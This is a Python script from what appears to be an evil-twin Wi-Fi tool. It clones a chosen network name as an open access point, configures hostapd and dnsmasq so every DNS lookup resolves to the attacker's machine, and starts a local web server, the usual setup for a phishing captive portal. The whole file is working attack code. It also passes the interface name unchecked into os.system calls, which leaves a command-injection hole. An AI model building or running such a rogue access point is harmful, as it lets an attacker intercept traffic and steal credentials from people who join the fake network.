import os
from threading import Thread
from string import Template


def cloneAP(SSID,interface):
   
    configFiles(SSID,interface) 
    os.system('sudo sh fakeAP/script/openedAP.sh') 
    
   
    os.system("ifconfig " +interface+ " 10.0.0.1 netmask 255.255.255.0")
    
    
    os.system("service apache2 start")
    print('The fake access point: {} '.format(SSID))
  


def configFiles(SSID,interface):
    
    with open('fakeAP/config/hostapd.conf','w') as f:
        f.write("interface="+interface+"\n")
        f.write("ssid="+SSID+"\n")
        f.write("channel=1\n")
        f.write("driver=nl80211\n")
        
    with open('fakeAP/config/dnsmasq.conf','w') as f:
        f.write("interface="+interface+"\n")
        f.write("bind-interfaces\n")
        f.write("dhcp-range=10.0.0.10,10.0.0.100,8h\n")
        f.write("dhcp-option=3,10.0.0.1\n") 
        f.write("dhcp-option=6,10.0.0.1\n") 
        f.write("address=/#/10.0.0.1\n") 

    

    